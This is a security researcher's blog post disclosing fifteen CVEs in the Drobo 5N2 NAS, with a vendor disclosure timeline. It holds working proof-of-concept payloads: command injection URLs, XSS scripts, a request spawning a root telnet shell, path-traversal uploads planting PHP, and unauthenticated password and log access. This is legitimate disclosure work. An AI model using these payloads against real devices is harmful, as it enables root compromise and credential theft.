=== Content from blog.securityevaluators.com_e20e23d4_20250124_190331.html ===
[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F4f1d885df7fc&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&source=---top_nav_layout_nav----------------------------------)

[Sign up](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fcall-me-a-doctor-new-vulnerabilities-in-drobo5n2-4f1d885df7fc&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fcall-me-a-doctor-new-vulnerabilities-in-drobo5n2-4f1d885df7fc&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

[Sign up](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fcall-me-a-doctor-new-vulnerabilities-in-drobo5n2-4f1d885df7fc&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fcall-me-a-doctor-new-vulnerabilities-in-drobo5n2-4f1d885df7fc&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# Vulnerabilities In Drobo5N2

## 15 vulnerabilities identified in research performed on popular NAS device Drobo 5N2.

[![Rick Ramgattie](https://miro.medium.com/v2/resize:fill:88:88/1*M-EfS6JpWLBlYQrmPIYSiA.jpeg)](https://medium.com/%40rramgattie?source=post_page---byline--4f1d885df7fc--------------------------------)[![Independent Security Evaluators](https://miro.medium.com/v2/resize:fill:48:48/1*zlPb8cRt0y45p5s2efL2uw.png)](https://blog.securityevaluators.com/?source=post_page---byline--4f1d885df7fc--------------------------------)

[Rick Ramgattie](https://medium.com/%40rramgattie?source=post_page---byline--4f1d885df7fc--------------------------------)

·

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F36598331fd0d&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fcall-me-a-doctor-new-vulnerabilities-in-drobo5n2-4f1d885df7fc&user=Rick+Ramgattie&userId=36598331fd0d&source=post_page-36598331fd0d--byline--4f1d885df7fc---------------------post_header-----------)

Published in[Independent Security Evaluators](https://blog.securityevaluators.com/?source=post_page---byline--4f1d885df7fc--------------------------------)·9 min read·Oct 25, 2018

--

Listen

Share

The DroboNAS 5N2 (affectionally called the Doctor Obo by one Shaun Mirani) is a popular Network Attached Storage (NAS) device I found while cruising [reddit](https://www.reddit.com/r/drobo/). There it is known as a device that provides robust functionality within a small footprint, and as a device that is smart enough to figure out what needs to be done with any extra storage you may throw at it. Above all, it looks pretty snazzy.

As part of our research, ISE Labs’ focused on the security of network accessible services provided by the Drobo NAS. Our research took into consideration both the device’s default state and what we considered it’s fully provisioned state. The following blog post covers the vulnerabilities we identified in the Drobo 5N2 running firmware version *4.0.5–13.28.96115*.

![]()
## Unauthenticated Command Injection in username parameter in enable\_user (CVE-2018–14699)

When issuing requests to the *enable\_user* endpoint that is part of the DroboAccess web application, the *username* parameter is sent as a command line argument without proper sanitization. When issuing a *GET* request with the URL below, the targeted device domain will create a file called *test\_ise* in the same directory as *enable\_user.php* (*/mnt/DroboFS/Shares/DroboApps/DroboAccess/www*).

The vulnerability itself is present in the *enableUser* function in */mnt/DroboFS/Shares/DroboApps/DroboAccess/www/includes/droboaccess.php*

> **PoC URL:** http://192.168.1.26:8080/DroboAccess/enable\_user?username=test';/bin/touch%20test\_ise'&enabled=true

Although the DroboAccess web application is not installed by default, it is expected that the average user will install and enable it as most users want to access their devices over a web browser or mobile device.

## Reflected Cross-Site Scripting in enable\_user (CVE-2018–14697)

When issuing requests to the *enable\_user* endpoint that is part of the DroboAccess web application, the *username* parameter is reflected in the server’s response without proper sanitization. When issuing a *GET* request with the URL below, the targeted device will return an HTML page containing the value of the *username* parameter within its body. The vulnerability itself is present in the *if* block at the bottom of the page at */mnt/DroboFS/Shares/DroboApps/DroboAccess/www/enable\_user.php*

> P**oC URL:** *http://192.168.1.26:8080/DroboAccess/enable\_user?username=<script>alert(1)</script>&enabled=true*

Although the DroboAccess web application is not installed by default, it is expected that the average user will install and enable it as most users want to access their devices over a web browser or mobile device.

## Reflected Cross-Site Scripting in delete\_user (CVE-2018–14698)

When issuing requests to the *delete\_user* endpoint that is part of the DroboAccess web application, the *username* parameter is reflected in the server’s response without proper sanitization. When issuing a *GET* request with the URL below, the targeted device domain will return an HTML page containing the value of the *username* parameter within its body. The vulnerability itself is present in the *if* block at the bottom of the page at */mnt/DroboFS/Shares/DroboApps/DroboAccess/www/delete\_user.php*

> **PoC URL:** *http://192.168.1.26:8080/DroboAccess/delete\_user?username=<script>alert(1)</script>*

Although the DroboAccess web application is not installed by default, it is expected that the average user will install and enable it as most users want to access their devices over a web browser or mobile device.

## Unauthenticated Command Injection in *username* parameter in delete\_user (CVE-2018–14701)

When issuing requests to the *delete\_user* endpoint that is part of the DroboAccess web application, the *username* parameter is sent as a command line argument without proper sanitization. When issuing a *GET* request with the URL below, the targeted device domain will create a file called *test\_ise2* in the same directory as *delete\_user.php* (*/mnt/DroboFS/Shares/DroboApps/DroboAccess/www*).

The vulnerability itself is present in the disableUser function in */mnt/DroboFS/Shares/DroboApps/DroboAccess/www/includes/droboaccess.php*

> **PoC URL:** http://192.168.1.26:8080/DroboAccess/delete\_user?username=test';/bin/touch%20test\_ise2'

Although the DroboAccess web application is not installed by default, it is expected that the average user will install and enable it as most users want to access their devices over a web browser or mobile device.

## Unauthenticated Access to MySQL Database Password (CVE-2018–14703)

The password used to log into the Web portal for the MySQL Database on the Drobo is available to anyone with network level access to the device. By issuing a *GET* request to the URL listed below, the server will return the password for the *root* user for the MySQL database.

> **PoC URL:** http://192.168.1.126:8080/mysql/api/droboapp/data

Although the MySQL web application is not installed by default, some users may install it to make the most out of their device.

## Unauthenticated Access to MySQL Log Files (CVE-2018–14700)

The logs for the web server hosting the MySQL web application are available to anyone with network level access to the device. The following log files are available to unauthenticated users when accessing the URL listed below. To access the file, you will need to provide a *GET* parameter called *name* along with the desired file.

> **PoC URL:** http://192.168.1.26:8080/mysql/api/logfile.php?name=<file>

**Log Files:**

> /tmp/DroboApps/mysql/log.txt
> /tmp/DroboApps/mysql/mysqld.log
> /tmp/DroboApps/mysql/webui.log,
> /tmp/DroboApps/mysql/install.log
> /tmp/DroboApps/mysql/update.log
> /tmp/DroboApps/mysql/reset.log
> /tmp/DroboApps/mysql/logrotate.log
> /tmp/DroboApps/mysql/access.log
> /tmp/DroboApps/mysql/error.log

Although the MySQL web application is not installed by default, it is expected that the average user will install and enable it to make the most out of their device.

## Unauthenticated Access to MySQL diag.php (CVE-2018–14695)

The diagnostic information for the MySQL server is available to anyone with network level access to the device. The following files are available as a zip compressed file to unauthenticated users when accessing the URL listed below. To access the file, you will need to provide a *GET* parameter called *name* along with the desired file.

> **PoC URL:** http://192.168.1.26:8080/mysql/api/diags.php?name=<file>

**Log Files:**

> access.log
> depends.txt
> description.txt
> error.log
> file\_data.txt
> framework\_version.txt
> log.txt
> my\_cnf.txt
> mysql\_ps.txt
> mysql\_status.txt
> mysqld.log
> name.txt
> pid.txt
> version.txt
> webui.log
> webui.txt

Although the MySQL web application is not installed by default, it is expected that the average user will install and enable it to make the most out of their device.

## Unauthenticated Access to device info via MySQL API drobo.php (CVE-2018–14696)

The device information for the Drobo device running the MySQL server is available to anyone with network level access to the device. The following file is returned to the user when they access the device with the URL provided below.

> **PoC URL:** http://192.168.1.26:8080/mysql/api/drobo.php

Although the MySQL web application is not installed by default, it is expected that the average user will install and enable it as most want to access their devices over a web browser or mobile device.

## Unauthenticated Access to device info via Drobo Pix API drobo.php (CVE-2018–14702)

The device information for the Drobo device running the Drobo Pix web application is available to anyone with network level access to it. The following file is returned to the user when they access the device with the URL provided below.

> **PoC URL:** http://192.168.1.26:8080/drobopix/api/drobo.php

Although the Drobo Pix web application is not installed by default, it is expected that the average user will install and enable it as most want to access their devices over a web browser or mobile device.

## Reflected Cross-Site Scripting via MySQL API droboapps.php (CVE-2018–14704)

The URL handler that interprets paths for the MySQL API does not properly sanitize the provided URL path before generating error messages. As a result, attackers can provide malicious URLs that evaluate JavaScript within the user’s browser under the context of the vulnerable Drobo device’s HTTP domain. After changing the domain to that of a vulnerable device, the URL below will open an *alert* box with the value 1. The vulnerable code is in */mnt/DroboFS/Shares/DroboApps/mysql/www/api/droboapps.php* under the *processRequest* function.

> **PoC URL:** *http://192.168.1.26:8080/mysql/api/droboapps/<script>alert(1)</script>*

Although the MySQL web application is not installed by default, some users will install and enable it to make the most out of their device.

## Unauthenticated Command Injection in DroboPix (CVE-2018–14706)

The optional DroboPix application provides an administrative page at *<IP>:8080/DroboPix*, which allows an administrator the ability to manage mobile devices connected to the application. During our assessment, we discovered that this administrative interface fails to adequately sanitize user input, resulting in command injection. By providing a malicious payload in a *POST* request to */DroboPix/api/drobopix/demo*, an attacker may execute arbitrary system commands as *root*. A *POST* request demonstrating this issue is provided below.

```
POST /DroboPix/api/drobopix/demo HTTP/1.1
Host: 192.168.1.26:8080
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 50{“enabled”:”false’;telnetd -l /bin/sh -p 8383 #”}
```

Once executed, this request will create an unauthenticated telnet server on port *8383*. An attacker may then get a *root* shell by simply connecting to the server with *telnet <IP> 8383*.

Although the DroboPix web application is not installed by default, it is expected that the average user will install and enable it as most want to access their devices over a web browser or mobile device.

## Unauthenticated Arbitrary File Upload in DroboPix (CVE-2018–14707)

The optional *DroboPix* application provides an instance of *tusd* — the server implementation of the *tus* resumable upload protocol. This service allows connected devices to easily upload files to the NAS device, but fails to ensure that these files are placed in a safe location. By providing a malicious filename, an attacker may upload arbitrary files to arbitrary locations on the filesystem. Because the web server is running as the *root* user, the attack allows files to be written nearly anywhere on the filesystem. As such, it would be trivial for an attacker to upload a malicious PHP file to a web-accessible location. Although a valid device ID is needed for the attack, other vulnerabilities allow an attacker to bypass this.

To exploit this issue, an attacker must upload a file with a relative path in the filename. However, the use of tus complicates this. Instead of a normal *POST* request, a *POST* and *PATCH* conforming to the *tus* protocol must be used. The first request is a *POST* which generates the file’s UUID, provides the filename, and provides the device ID. Filename and device ID are base64-encoded and provided in the *Upload-Metadata* header. In this example, the malicious filename is *../../../../../DroboApps/mysql/www/bork.php*. The UUID is provided by the server in the *Location* header of the response. An example request and response is provided below.

```
POST /files/ HTTP/1.1
Host: 192.168.1.26:9090
Connection: close
Content-Length: 0
Tus-Resumable: 1.0.0
Upload-Length: 22
Upload-Metadata: filename Li4vLi4vLi4vLi4vLi4vRHJvYm9BcHBzL0Ryb2JvUGl4L3d3dy9ib3JrLnBocA==,filetype dGV4dC9wbGFpbg==, deviceid dWIxZTZkM2RhYWMwNTRmYWU4NTZlNzU0OWMwNGZmNjli
Accept: */*
Accept-Encoding: gzip, deflateHTTP/1.1 201 Created
Location: http://192.168.1.26:9090/files/3b753d4ca7c33ae90243e381bcdb005d
Tus-Resumable: 1.0.0
X-Content-Type-Options: nosniff
Date: Fri, 29 Jun 2018 17:13:21 GMT
Content-Length: 0
Connection: close
```

The next request must be a *PATCH* request containing the file’s contents. The UUID provided by the server in the previous request must be used in the URL for this request. An example request and response is provided below.

```
PATCH /files/3b753d4ca7c33ae90243e381bcdb005d HTTP/1.1
Host: 192.168.1.26:9090
Connection: close
Content-Length: 22
Tus-Resumable: 1.0.0
Origin: https://tus.io
Upload-Offset: 0
Content-Type: application/offset+octet-stream
Accept: */*
Accept-Encoding: gzip, deflate<?phpphpinfo();?>HTTP/1.1 204 No Content
Access-Control-Allow-Origin: <https://tus.io>
Access-Control-Expose-Headers: Upload-Offset, Location, Upload-Length, Tus-Version, Tus-Resumable, Tus-Max-Size, Tus-Extension, Upload-Metadata
Tus-Resumable: 1.0.0
Upload-Offset: 22
X-Content-Type-Options: nosniff
Date: Fri, 29 Jun 2018 17:13:30 GMT
Connection: close
```

The malicious file will now be accessible at *<IP>:8080/DroboPix/bork.php*. This attack works by performing path traversal during the upload process. Although files are normally stored in */mnt/DroboFS/Shares/Public/Photo Uploads/<Device name>/<Year>/<Month>/*, a file may be placed elsewhere by supplying *../* to traverse up a directory and then supplying a new directory afterward. In the example above, *../* was used 5 times to traverse up to */mnt/DroboFS/Shares/* and then */DroboApps/DroboPix/www/* was supplied to traverse to the web-accessible directory */mnt/DroboFS/Shares/DroboApps/DroboPix/www/*.

Although the Drobo Pix web application is not installed by default, it is expected that the average user will install and enable it as most want to access their devices over a web browser or mobile device.

## Insufficient Authentication in Client-Server Communications Between Drobo Dashboard and NASd (CVE-2018–14709)

The API used between the Drobo Dashboard and NASd makes use of the device’s serial number as a form of authentication. During our research, we determined that the serial number is returned to the client when they attempt to connect to the device on port 5000 (*nc <device ip> 5000*). The value of the *mESAID* XML object is the authentication token we will need to communicate with the victim device. After extracting the device’s serial number, we can now freely communicate with the device. As illustrated in the included Python script, after you have extracted the device’s identifier, you perform any command otherwise performed by the DroboDashboard.

## Missing Transport Security in Client-Server Communications Between Drobo Dashboard and NASd (CVE-2018–14708)

In *Insufficient Authentication in Client-Server Communications Between Drobo Dashboard and NASd* we discuss how the lack of a proper authentication system grants the attacker the ability to perform arbitrary actions on a targeted Drobo device. In addition to the lack of authentication, client-server communications suffer a lack of transport security. As a result, attackers can both eavesdrop on, modify, and replay all communications between both end-points. We used the lack of transport security reverse engineering this proprietary protocol and create the python script outlined above.

## Responsible Disclosure Timeline

* **July 6, 2018:** Contacted Drobo about sending vulnerabilities over.
* **July 10, 2018:** Tried to contact Drobo again (Sent them a list of the vulnerabilities we identified.) No response from Drobo.
* **August 22, 2018:** Sent CVE numbers provided by MITRE over to Drobo. No Response from Drobo.

*Rick Ramgattie, Security Analyst at* [*Independent Security Evaluators*](http://securityevaluators.com)

*Twitters:* [*@ISESecurity*](https://twitter.com/ISEsecurity) *@rramgattie*

[**Sign up to get our latest blogs.**](http://eepurl.com/bLc2bf)

[Hacking](https://medium.com/tag/hacking?source=post_page-----4f1d885df7fc--------------------------------)[Ise Labs](https://medium.com/tag/ise-labs?source=post_page-----4f1d885df7fc--------------------------------)[IoT](https://medium.com/tag/iot?source=post_page-----4f1d885df7fc--------------------------------)[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page-----4f1d885df7fc--------------------------------)[Cve](https://medium.com/tag/cve?source=post_page-----4f1d885df7fc--------------------------------)

--

--

[![Independent Security Evaluators](https://miro.medium.com/v2/resize:fill:96:96/1*zlPb8cRt0y45p5s2efL2uw.png)](https://blog.securityevaluators.com/?source=post_page---post_publication_info--4f1d885df7fc--------------------------------)[![Independent Security Evaluators](https://miro.medium.com/v2/resize:fill:128:128/1*zlPb8cRt0y45p5s2efL2uw.png)](https://blog.securityevaluators.com/?source=post_page---post_publication_info--4f1d885df7fc--------------------------------)[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fcollection%2Findependent-security-evaluators&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fcall-me-a-doctor-new-vulnerabilities-in-drobo5n2-4f1d885df7fc&collection=Independent+Security+Evaluators&collectionId=85ea1a550e4c&source=post_page---post_publication_info--4f1d885df7fc---------------------follow_profile-----------)[## Published in Independent Security Evaluators](https://blog.securityevaluators.com/?source=post_page---post_publication_info--4f1d885df7fc--------------------------------)[1K Followers](/followers?source=post_page---post_publication_info--4f1d885df7fc--------------------------------)·[Last published Mar 7, 2022](/reading-hackable-without-a-background-in-security-a22ebe59b3e8?source=post_page---post_publication_info--4f1d885df7fc--------------------------------)

Security specialists that provide custom services including security assessments and software development. ISE also runs IoT Village, which hosts talks by expert security researchers and hacking contests.

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fcollection%2Findependent-security-evaluators&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fcall-me-a-doctor-new-vulnerabilities-in-drobo5n2-4f1d885df7fc&collection=Independent+Security+Evaluators&collectionId=85ea1a550e4c&source=post_page---post_publication_info--4f1d885df7fc---------------------follow_profile-----------)[![Rick Ramgattie](https://miro.medium.com/v2/resize:fill:96:96/1*M-EfS6JpWLBlYQrmPIYSiA.jpeg)](https://medium.com/%40rramgattie?source=post_page---post_author_info--4f1d885df7fc--------------------------------)[![Rick Ramgattie](https://miro.medium.com/v2/resize:fill:128:128/1*M-EfS6JpWLBlYQrmPIYSiA.jpeg)](https://medium.com/%40rramgattie?source=post_page---post_author_info--4f1d885df7fc--------------------------------)[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F36598331fd0d&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fcall-me-a-doctor-new-vulnerabilities-in-drobo5n2-4f1d885df7fc&user=Rick+Ramgattie&userId=36598331fd0d&source=post_page-36598331fd0d--post_author_info--4f1d885df7fc---------------------follow_profile-----------)[## Written by Rick Ramgattie](https://medium.com/%40rramgattie?source=post_page---post_author_info--4f1d885df7fc--------------------------------)[188 Followers](https://medium.com/%40rramgattie/followers?source=post_page---post_author_info--4f1d885df7fc--------------------------------)·[40 Following](https://medium.com/%40rramgattie/following?source=post_page---post_author_info--4f1d885df7fc--------------------------------)[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F36598331fd0d&operation=register&redirect=https%3A%2F%2Fblog.securityevaluators.com%2Fcall-me-a-doctor-new-vulnerabilities-in-drobo5n2-4f1d885df7fc&user=Rick+Ramgattie&userId=36598331fd0d&source=post_page-36598331fd0d--post_author_info--4f1d885df7fc---------------------follow_profile-----------)
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----4f1d885df7fc--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----4f1d885df7fc--------------------------------)[About](https://medium.com/about?autoplay=1&source=post_page-----4f1d885df7fc--------------------------------)[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----4f1d885df7fc--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----4f1d885df7fc--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----4f1d885df7fc--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----4f1d885df7fc--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----4f1d885df7fc--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----4f1d885df7fc--------------------------------)[Teams](https://medium.com/business?source=post_page-----4f1d885df7fc--------------------------------)


